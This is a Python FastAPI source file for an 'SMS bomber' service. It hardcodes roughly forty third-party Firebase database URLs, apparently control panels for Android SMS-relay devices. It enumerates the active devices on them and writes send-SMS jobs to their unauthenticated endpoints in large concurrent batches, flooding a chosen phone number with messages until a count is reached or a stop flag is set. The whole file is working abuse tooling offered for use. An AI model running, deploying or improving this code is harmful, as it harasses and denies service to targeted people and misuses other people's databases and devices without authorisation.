#!/usr/bin/env python3
"""
🔥 ULTRA FIREBASE BOMBER v5 - Vercel + Redis
- Unlimited count (background worker)
- /stop?number=XXX to kill job
- Flash speed 🚄
"""
import asyncio, time, os, json
from datetime import datetime
from uuid import uuid4
from collections import defaultdict
import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from upstash_redis.asyncio import Redis

FIREBASE_URLS = [
    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://alwaysatiif7-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://check-skyler-default-rtdb.firebaseio.com",
    "https://chilgumsir-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://deepk-hh-default-rtdb.firebaseio.com",
    "https://desert-fc320-default-rtdb.firebaseio.com",
    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
    "https://gfaatelisell-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://kalih-f389d-default-rtdb.firebaseio.com",
    "https://keepsnss-default-rtdb.firebaseio.com",
    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
    "https://maxo12-default-rtdb.firebaseio.com",
    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
    "https://mook-1ddfc-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "https://sk-paid-panel-default-rtdb.firebaseio.com",
    "https://tinmur-777e8-default-rtdb.firebaseio.com",
    "https://vasu-new-panel-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://adani-5dd2c-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://project9-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
]

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

MAX_CONCURRENT = 200
BATCH_SIZE = 500          # per background wave
REQUEST_TIMEOUT = 8

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"],
                   allow_methods=["*"], allow_headers=["*"])

# 🔴 Upstash Redis (env var se aayega)
REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
redis = Redis(url=REDIS_URL, token=REDIS_TOKEN) if REDIS_URL else None


def clean(url):
    return url.rstrip("/").replace(".json", "").rstrip("/")


async def fetch_devices(session, url):
    try:
        async with session.get(f"{clean(url)}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            return [
                {"id": k, "url": clean(url)}
                for k, v in data.items()
                if isinstance(v, dict) and v.get("status") is True
            ]
    except Exception:
        return []


async def get_all_devices(session):
    results = await asyncio.gather(*[fetch_devices(session, u) for u in FIREBASE_URLS],
                                    return_exceptions=True)
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)
    return out


async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payload = {
            "from": 1, "to": target, "message": message,
            "isSended": False, "timestamp": int(time.time() * 1000),
        }
        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"
            try:
                async with session.put(url, json=payload) as r:
                    if r.status in (200, 201):
                        stats["success"] += 1
                        return True
                    if r.status == 403:
                        return False
            except Exception:
                continue
        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    """Check Redis for stop flag"""
    if not redis:
        return False
    try:
        val = await redis.get(f"stop:{number}")
        return val is not None
    except Exception:
        return False


async def bomb_worker(number: str, message: str, count: int):
    """Background worker — runs until done or stopped"""
    jid = str(uuid4())[:8]
    t0 = time.time()

    # Clear any old stop flag
    if redis:
        try:
            await redis.delete(f"stop:{number}")
        except Exception:
            pass

    connector = aiohttp.TCPConnector(limit=500, limit_per_host=100,
                                      ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=4)
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 11)",
        "Content-Type": "application/json",
    }

    async with aiohttp.ClientSession(connector=connector, timeout=timeout,
                                      headers=headers) as session:
        devices = await get_all_devices(session)
        if not devices:
            return

        ndev = len(devices)
        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0}
        sent_total = 0

        while sent_total < count:
            # 🔴 STOP CHECK
            if await is_stopped(number):
                print(f"[{jid}] 🛑 Stopped by user at {sent_total}")
                break

            # 🔴 Vercel 10s/60s limit — chhota batch lo
            batch = min(BATCH_SIZE, count - sent_total)

            tasks = [
                send_one(session, devices[(sent_total + i) % ndev],
                         number, message, sem, stats)
                for i in range(batch)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            sent_total += batch

            # Stop check again
            if await is_stopped(number):
                break

    elapsed = round(time.time() - t0, 2)
    print(f"[{jid}] DONE sent={stats['success']} fail={stats['failed']} in {elapsed}s")


# ═══════════════════════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {"status": "🔥 BOMBER v5 ONLINE", "firebases": len(FIREBASE_URLS)}


@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    if request.method == "GET":
        data = dict(request.query_params)
    else:
        try:
            data = await request.json()
        except Exception:
            data = dict(await request.form())

    message = data.get("message") or data.get("msg")
    number = data.get("number") or data.get("num")
    try:
        count = int(data.get("count", 1))
    except Exception:
        return JSONResponse({"success": False, "error": "bad count"}, 400)

    if not message or not number:
        return JSONResponse({"success": False, "error": "missing params"}, 400)

    number = str(number).replace("+", "").replace(" ", "").replace("-", "").strip()

    # 🔥 Fire & forget — background me chalega
    bg.add_task(bomb_worker, number, message, count)

    return {
        "success": True,
        "message": f"🚀 Bombing started for {number}",
        "count": count,
        "stop_url": f"/stop?number={number}",
    }


@app.get("/stop")
async def stop_endpoint(number: str = Query(...)):
    number = number.replace("+", "").replace(" ", "").replace("-", "").strip()
    if not redis:
        return JSONResponse({"success": False, "error": "Redis not configured"}, 500)
    try:
        await redis.set(f"stop:{number}", "1", ex=300)  # 5 min TTL
        return {
            "success": True,
            "message": f"🛑 Stop signal sent for {number}",
            "number": number,
        }
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, 500)


@app.get("/devices")
async def devices():
    connector = aiohttp.TCPConnector(limit=200)
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
        d = await get_all_devices(s)
    return {"success": True, "total": len(d), "devices": d}


@app.get("/health")
async def health():
    return {"status": "ok", "time": datetime.now().isoformat()}
